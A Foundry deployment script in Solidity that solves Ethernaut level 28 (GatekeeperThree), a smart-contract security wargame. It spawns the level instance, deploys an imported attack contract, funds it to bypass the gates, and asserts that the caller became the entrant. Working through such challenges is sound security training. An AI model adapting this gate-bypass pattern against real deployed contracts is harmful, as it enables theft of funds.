// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { GatekeeperThree } from "src/Level28.sol";
import { L28Attack } from "src/Level28Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = uint256(vm.envBytes32("DEPLOYER_PRIVATE_KEY"));
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x653239b3b3E67BC0ec1Df7835DA2d38761FfD882);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address payable instanceAddress = payable(address(uint160(uint256(entries[0].topics[2]))));
        console2.log(instanceAddress);

        (,, address txOrigin) = vm.readCallers();
        GatekeeperThree gk = GatekeeperThree(instanceAddress);
        gk.createTrick();
        L28Attack attack = new L28Attack(gk);

        attack.attack{ value: 0.001 ether + 1 }();
        require(gk.entrant() == txOrigin, "attack failed");

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
